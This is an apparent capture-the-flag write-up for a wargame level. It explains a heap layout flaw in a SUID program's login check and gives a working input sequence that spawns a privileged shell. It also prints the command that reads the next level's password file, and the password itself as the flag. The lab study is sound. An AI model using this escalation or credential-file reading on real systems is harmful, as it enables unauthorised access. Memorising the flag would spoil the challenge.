# Level 8

Same recon as level0: SUID **level9**.

## Analysis

```c
char *auth = NULL, *service = NULL;

int main(void) {
    char buf[128];
    for (;;) {
        printf("%p, %p \n", auth, service);     // prints both pointers each loop
        if (!fgets(buf, 128, stdin)) return 0;
        if (memcmp(buf, "auth ", 5) == 0) {
            auth = malloc(4); auth[0] = '\0';
            if (strlen(buf + 5) < 0x1f) strcpy(auth, buf + 5);
        }
        if (memcmp(buf, "reset", 5) == 0) free(auth);
        if (memcmp(buf, "service", 6) == 0) service = strdup(buf + 7);
        if (memcmp(buf, "login", 5) == 0) {
            if (*(int *)(auth + 0x20) == 0) fwrite("Password:\n", 1, 10, stdout);
            else system("/bin/sh");             // win
        }
    }
}
```

A small REPL with four commands: `auth`, `reset`, `service`, `login`. The one that matters is `login`: it gives us a shell, but only when the check on `auth + 0x20` passes. To exploit it, we first have to understand exactly what that check reads.

### Reading the `login` check

```c
if (*(int *)(auth + 0x20) == 0)
    fwrite("Password:\n", 1, 10, stdout);   // check failed
else
    system("/bin/sh");                       // check passed, we win
```

We want the `else` branch. So we need `*(int *)(auth + 0x20)` to be non-zero. That expression looks dense, so let's build it up piece by piece with a simple mental model.

**Memory is a street of numbered boxes.** Think of the computer's memory as one very long street. Every house on it has a number (an address), and each house holds exactly one byte (a value from 0 to 255). A pointer is just a house number written on a piece of paper. `auth` is such a paper, and right now it has `0x804a008` written on it. That is not the data, it is the address of where the data lives.

```
house #:  0x804a008  0x804a009  0x804a00a  0x804a00b  0x804a00c ...
contents: [  ?  ]    [  ?  ]    [  ?  ]    [  ?  ]    [  ?  ]
           ^
           auth points here
```

**`auth + 0x20` means walk 32 houses down the street.** Adding a number to a pointer is not normal math on the data, it moves along the street. `auth` points to `char`, and one `char` takes exactly one house, so adding `0x20` (32 in decimal) means "count 32 houses forward from `auth`."

```
0x804a008  + 32 houses  =  0x804a028
   ^                          ^
   auth                       auth + 0x20
```

We have not read anything yet. We just walked down the street and are now standing in front of a different house, `0x804a028`.

> **What is `0x804a028`?** Nothing magic, it is just a memory address on the heap, the result of the calculation `auth + 0x20`. The `0x` means hexadecimal, and `0x20` is 32 in decimal, so `0x804a008 + 0x20 = 0x804a028`. It is the house sitting 32 bytes after the start of `auth`, and it is exactly the address whose 4 bytes the `login` check reads. Further down we will see it lands 16 bytes inside `service`'s data, which is the key to the exploit.

**`(int *)` means read 4 houses as one number.** A single house holds one byte, but an `int` is a 4-byte value, so an `int` is stored across 4 neighboring houses. The cast tells C: "when I look at this address, don't read one byte, read the 4 houses starting here and glue them into one 4-byte number."

```
0x804a028  0x804a029  0x804a02a  0x804a02b
[ byte0 ]  [ byte1 ]  [ byte2 ]  [ byte3 ]
 \________________________________________/
          these 4 bytes together = one int
```

**The leading `*` means actually go read it.** Until now the expression is still just "the address `0x804a028`, read as an int." The `*` is the command "go there and fetch the value." So `*(int *)(auth + 0x20)` is the 4-byte number currently stored in houses `0x804a028` through `0x804a02b`.

So in plain words the check is: "walk 32 houses past where `auth` points, read the 4 bytes there as one number. If it is zero, ask for a password. If it is non-zero, launch a shell."

### Why those bytes don't belong to `auth`

`auth` was created with `malloc(4)`, a request for just 4 bytes. But the check reads at offset `0x20`, which is 32 bytes past the start. That is far outside `auth`'s own little allocation:

```
0x804a008   <- auth points here. Its own 4 bytes live at 0x804a008..0x804a00b
   ...       <- heap memory that has nothing to do with auth
0x804a028   <- auth + 0x20. THIS is what the login check reads
```

The program is reading memory it never assigned to `auth`. Fresh heap memory from the kernel is zeroed, so by default those 4 bytes are `0` and the check fails. To win we need to place our own non-zero bytes at `auth + 0x20`. We can't do it through `auth` itself (see the note at the end), so we do it with `service`.

### Landing our data on that spot

`malloc` and `strdup` hand out new blocks one after another on the heap. When we send an `auth` command and then a `service` command, `service` (created by `strdup`) is placed right after `auth`. So a long enough `service` string stretches over the `auth + 0x20` address and fills it with our characters.

> **Arranging the heap.** `malloc` places new blocks right after existing ones. `auth` is a small 16-byte block; `service` lands right after it, so a long enough `service` string reaches the `auth + 0x20` spot. See [heap layout](../knowledge_base/heap_overflow.md#heap-layout).

The best part: the program prints `auth` and `service` on every loop with `printf("%p, %p")`, so we can read the real addresses at runtime instead of guessing offsets.

## Exploit

```
$ ./level8
(nil), (nil)
auth AAAA
0x804a008, (nil)
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

Now we use the printed addresses to line everything up. After the two commands the program prints `0x804a008, 0x804a018`, so `auth = 0x804a008` and `service = 0x804a018`.

Work out where the check reads, measured from the start of our `service` data:

```
auth + 0x20 = 0x804a028      (address the login check reads)
service     = 0x804a018      (start of our string)
difference  = 0x804a028 - 0x804a018 = 0x10 = 16
```

So `auth + 0x20` is byte number 16 of our `service` string (counting from 0). For that byte to be one of our characters, and not the `\0` that ends the string, the string must be at least 17 characters long. 30 A's is comfortably past that, so byte 16 is an `'A'` (`0x41`, non-zero), the check reads a non-zero value, and `system("/bin/sh")` runs.

(Overflowing `auth` directly does not work: its `strcpy` is gated by `strlen < 0x1f`, which stops writing at `0x804a027`, one byte short of `auth + 0x20`.)

Flag: `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`
